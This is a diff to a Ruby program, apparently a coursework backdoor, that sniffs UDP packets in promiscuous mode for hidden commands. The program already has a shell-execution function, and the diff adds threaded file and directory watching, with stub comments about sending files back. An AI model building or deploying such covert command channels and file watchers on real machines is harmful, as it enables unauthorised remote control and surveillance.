@@ -18,8 +18,10 @@
 --
 -- PROGRAMMERS:   Chris Wood - chriswood.ca@gmail.com
 -- 
--- NOTES:         weird buffer for capture, client needs to send 2 commmands
---                before server receives both at the same time
+-- NOTES:         ** weird buffer for capture, client needs to send 2 commmands
+--                  before server receives both at the same time
+--                **watch functionality starts threads, no implemented interface
+--                  to manage or kill them
 ---------------------------------------------------------------------------------------
 =end
 
@@ -52,15 +54,15 @@ FILE = "file"
 def start_listen_server
   puts "server listening on #{@cfg_iface}->#{@cfg_pen_protocol}:#{@cfg_pen_port}"
   #filter = "#{@cfg_pen_protocol} and dst port #{@cfg_pen_port}"
-  # for whatever reason this filter stopped working?
+  # ^for whatever reason this filter stopped working?
   filter = "udp"
-  puts filter
   begin
     cap = PacketFu::Capture.new(:iface => @cfg_iface,
       :start => true,
       :promic => true,
       :filter => filter)
     cap.stream.each do |p|
+      threads = []
       pkt =  PacketFu::Packet.parse(p)
       if @cfg_pen_protocol == TCP && pkt.udp_dst == @cfg_pen_port
         puts "in TCP mode" #DEBUG
@@ -80,10 +82,15 @@ def start_listen_server
             #get resp
             #start other junk for knock and send back
           when MODE_WATCH
+            puts "watch"
             if cmds[2] == DIR
-              start_watch(DIR, cmds[3])
+              t = Thread.new { start_watch(DIR, cmds[3]) }
+              threads.push(t)
+              threads[threads.length-1].join
             elsif cmds[2] == FILE
-              start_watch(FILE, cmds[3])
+              t = Thread.new { start_watch(FILE, cmds[3]) }
+              threads.push(t)
+              threads[threads.length-1].join
             end
           end
         else
@@ -108,9 +115,25 @@ def execute_shell_command(command)
 end
 
 def start_watch(type, name)
-  #type is file or folder
-  puts type
-  
+  if type == DIR
+    glob = '**/*'
+  else
+    glob = name
+  end
+  FSSM.monitor('/test', glob) do
+    update { |base, relative|
+      puts "#{base}/#{relative} has been updated"
+      # send file
+    }
+    delete { |base, relative|
+      puts "#{base}/#{relative} has been deleted"
+      # send message
+    }
+    create { |base, relative|
+      puts "#{base}/#{relative} has been created"
+      # send file
+    }
+  end
 end
 
 def send_file(file, destination)
